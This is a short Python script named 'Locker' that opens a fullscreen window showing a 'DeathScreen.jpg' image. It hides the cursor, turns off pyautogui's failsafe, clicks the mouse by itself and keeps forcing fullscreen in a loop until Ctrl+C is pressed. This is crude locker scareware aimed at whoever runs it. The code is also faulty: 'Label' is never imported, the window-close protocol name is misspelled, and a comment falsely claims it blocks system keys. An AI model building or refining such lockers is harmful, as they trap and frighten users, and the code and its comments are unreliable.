from tkinter import Tk, PhotoImage
from pyautogui import click, moveTo
import pyautogui
from time import sleep
from PIL import ImageTk, Image

def callback(event):
    global k,Entry  #entry
    k=True  #entreis values

def on_closing():
    root.config(cursor="none")
    root.attributes('-fullscreen', True) # size of app
    root.protocol('WM-DELETE_WINDOW', on_closing) # blocking win,alt,shift keys
    root.update()
    root.bind('<Control-KeyPress-c>', callback)
    
root=Tk()

image2 = Image.open('DeathScreen.jpg')
image1 = ImageTk.PhotoImage(image2)
pyautogui.FAILSAFE = False

root.title('Locker')
root.attributes('-fullscreen',True)
image_label = Label(root, image=image1)
image_label.place(x = 0, y = 0)

root.update(); sleep(0.02); click(675, 420)
k = False
while k!=True: on_closing()




